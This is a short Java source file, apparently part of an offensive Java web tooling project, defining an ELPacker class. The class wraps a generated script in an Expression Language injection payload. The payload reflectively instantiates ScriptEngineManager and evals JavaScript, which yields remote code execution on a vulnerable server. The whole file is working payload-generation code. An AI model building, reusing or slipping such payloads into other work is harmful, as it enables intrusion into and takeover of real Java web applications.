package com.reajason.javaweb.packer.el;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class ELPacker implements Packer {
    String template = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(ClassPackerConfig config) {
        String script = Packers.ScriptEngine.getInstance().pack(config);
        return template.replace("{{script}}", script);
    }
}
